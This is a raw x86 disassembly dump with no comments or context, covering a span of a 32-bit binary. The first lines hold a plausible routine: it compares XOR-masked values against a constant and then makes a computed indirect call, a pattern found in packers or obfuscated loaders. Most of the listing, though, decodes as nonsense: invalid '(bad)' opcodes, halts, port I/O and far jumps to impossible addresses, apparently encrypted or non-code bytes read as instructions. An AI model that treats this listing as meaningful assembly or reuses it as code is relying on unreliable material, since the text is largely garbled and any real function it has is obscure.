  40de0c:	sbb    ebx,DWORD PTR [edx+0x237acbb3]
  40de12:	loop   0x40de44
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx+0x62755fde],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40de1a
  40de8e:	pop    edx
  40de8f:	jmp    0xcdcbd269
  40de94:	mov    cl,0x98
  40de96:	or     BYTE PTR [edi-0x6b],0x27
  40de9a:	repnz pop ebx
  40de9c:	xchg   ecx,eax
  40de9d:	and    esi,DWORD PTR [esp+ebp*4+0x24]
  40dea1:	jmp    FWORD PTR [edx+0x150e54c5]
  40dea7:	test   al,0x85
  40dea9:	jmp    0x40de4a
  40deab:	fs jno 0x40deda
  40deae:	fsubr  st(2),st
  40deb0:	ror    DWORD PTR [ebp+ebx*8+0x5b],0xee
  40deb5:	sbb    bh,cl
  40deb7:	jbe    0x40df2d
  40deb9:	xor    eax,0x7896f99f
  40debe:	jo     0x40def3
  40dec0:	ror    DWORD PTR [ebp-0x1c4b2462],0x7f
  40dec7:	sbb    ah,bh
  40dec9:	mov    ds:0x59adeefa,al
  40dece:	mov    ebx,0x3c126976
  40ded3:	mov    bh,0xcd
  40ded5:	mov    ds:0x46066f09,al
  40deda:	and    DWORD PTR cs:[esi-0xe],ebx
  40dede:	pop    esi
  40dedf:	or     ah,BYTE PTR [esi-0x92b6aad]
  40dee5:	mov    ah,0x46
  40dee7:	lods   al,BYTE PTR ds:[esi]
  40dee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dee9:	cmp    BYTE PTR [esi+ecx*2+0x3d2dae3c],dh
  40def0:	ret    
  40def1:	test   eax,0xb512e9b4
  40def6:	push   eax
  40def7:	pop    ds
  40def8:	fisttp WORD PTR [edx+0xb]
  40defb:	jecxz  0x40def2
  40defd:	pop    ebx
  40defe:	jno    0x40df74
  40df00:	jp     0x40dee3
  40df02:	loop   0x40de9d
  40df04:	stos   BYTE PTR es:[edi],al
  40df05:	repz test BYTE PTR ds:0x85537978,0x3e
  40df0d:	xor    DWORD PTR ds:0x57fb0511,ebx
  40df13:	mov    bl,0x3d
  40df15:	xor    ch,dl
  40df17:	jecxz  0x40df28
  40df19:	push   ss
  40df1a:	pop    ds
  40df1b:	cmp    edx,DWORD PTR [edi-0x7f]
  40df1e:	sub    DWORD PTR [edx-0x7597bcd4],esi
  40df24:	hlt    
  40df25:	sbb    al,0xad
  40df27:	sbb    BYTE PTR [ecx+0x735b0d6a],cl
  40df2d:	cli    
  40df2e:	test   DWORD PTR [ecx+ebp*1],edx
  40df31:	loope  0x40dfa4
  40df33:	dec    edi
  40df34:	inc    ebx
  40df35:	push   edi
  40df36:	sar    DWORD PTR [edi+edi*8],1
  40df39:	stc    
  40df3a:	sbb    edi,ebx
  40df3c:	dec    edi
  40df3d:	scas   al,BYTE PTR es:[edi]
  40df3e:	xchg   ebx,eax
  40df3f:	mov    edi,0x3d6a230c
  40df44:	test   al,0xf9
  40df46:	pop    es
  40df47:	add    al,0xd4
  40df49:	xchg   ecx,eax
  40df4a:	aam    0xa1
  40df4c:	les    ebp,FWORD PTR [edi+0x22]
  40df4f:	mov    ds:0xad22da81,al
  40df54:	lds    ebp,FWORD PTR [esi+ecx*1-0x4a6cd571]
  40df5b:	or     dh,BYTE PTR [si-0xc5c]
  40df60:	sub    al,0xc2
  40df62:	mov    ah,0xf6
  40df64:	sub    al,0xe5
  40df66:	mov    ebp,0x4039af39
  40df6b:	jns    0x40df18
  40df6d:	mov    ch,0x9e
  40df6f:	jbe    0x40dfa7
  40df71:	into   
  40df72:	xor    DWORD PTR ds:0xa81d0707,edi
  40df78:	mov    ds:0xa26dca1f,al
  40df7d:	add    al,0xbe
  40df7f:	and    al,0x68
  40df81:	js     0x40df0b
  40df83:	inc    ecx
  40df84:	push   es
  40df85:	xor    DWORD PTR [edx],ebp
  40df87:	shl    BYTE PTR [esi],cl
  40df89:	hlt    
  40df8a:	sbb    eax,0xdad09e4
  40df8f:	retf   0xfc70
  40df92:	js     0x40df27
  40df94:	jno    0x40dff2
  40df96:	xchg   ebp,eax
  40df97:	pushf  
  40df98:	(bad)  
  40df99:	mov    ebx,0xfcf20128
  40df9e:	lock mov esi,0xe3b318a
  40dfa4:	and    DWORD PTR [edx],esp
  40dfa6:	mov    ds:0xc6488e4,eax
  40dfab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfac:	or     DWORD PTR ds:0x84fc9b9a,ecx
  40dfb2:	hlt    
  40dfb3:	mov    esp,0x73dbc1aa
  40dfb8:	xchg   BYTE PTR [ebx-0x79],al
  40dfbb:	retf   
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
